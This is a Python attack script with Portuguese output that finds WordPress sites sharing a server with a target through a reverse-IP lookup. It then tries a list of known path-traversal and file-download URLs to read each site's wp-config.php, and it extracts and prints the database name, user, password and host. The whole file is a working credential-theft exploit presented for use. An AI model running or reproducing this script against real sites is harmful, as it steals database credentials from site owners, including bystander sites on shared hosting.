#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from os import system
import sys
import urllib.parse
import urllib.request
import json
import re
import requests


reversing = []
vullns = [
    '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
    '/wp-content/force-download.php?file=../wp-config.php',
    '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
    '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
    '/wp-content/themes/markant/download.php?file=../../wp-config.php',
    '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
    '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
]


def Main():
    Sistema()
    Argumentos()
    ReverseIP(target)
    Verific()


class Colors:
    red = "\033[91m"
    green = "\033[32m"
    default = "\033[0m"


def Sistema():
    if sys.platform in ['linux', 'linux2']:
        system("clear")
    else:
        system("cls")


def Argumentos():
    global target
    if len(sys.argv) < 2:
        print("Use python3 --target host")
        quit()
    else:
        target = sys.argv[2].replace(
            "http://", "").replace("https://", "").replace("www.", "")


def ReverseIP(alvo):
    global reversing
    UserAgent = "Mozilla/5.0 (X11; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0"
    url = "http://domains.yougetsignal.com/domains.php"
    contenttype = "application/x-www-form-urlencoded; charset=UTF-8"
    post = [('remoteAddress', alvo)]
    post = urllib.parse.urlencode(post).encode('utf-8')
    r = urllib.request.Request(url, post)
    r.add_header("Content-Type", contenttype)
    r.add_header("User-Agent", UserAgent)
    resul = urllib.request.urlopen(r).read()
    todos = json.loads(resul.decode('utf-8'))
    if todos['status'] == "Fail":
        print("Seu IP foi bloqueado :/")
    else:
        for i in todos['domainArray']:
            reversing.append(i)


def Attack(site):
    global vullns
    for i in vullns:
        try:
            req = requests.get(site + i).text
            if "DB_NAME" in req:
                data = {
                    'DB_NAME:': re.findall("'DB_NAME', '(.*?)'", req),
                    'DB_USER:': re.findall("'DB_USER', '(.*?)'", req),
                    'DB_PASSWORD:': re.findall("'DB_PASSWORD', '(.*?)'", req),
                    'DB_HOST:': re.findall("'DB_HOST', '(.*?)'", req)
                }
                for i in data:
                    print(Colors.green + i, data[i][0] + Colors.default)

        except:
            pass


def Verific():
    global reversing
    for i in reversing:
        try:
            req = requests.get("http://www." + i[0]).text
            if "/wp-content/" in req or "/wp-includes/" in req:
                print(Colors.default + "http://" +
                      i[0] + Colors.red + " CMS: WordPress")
                Attack("http://" + i[0])
            else:
                print("http://" + i[0] + " CMS não detectado.")
        except:
            print("Não foi possivel acessar: http://www." + i[0])


Main()
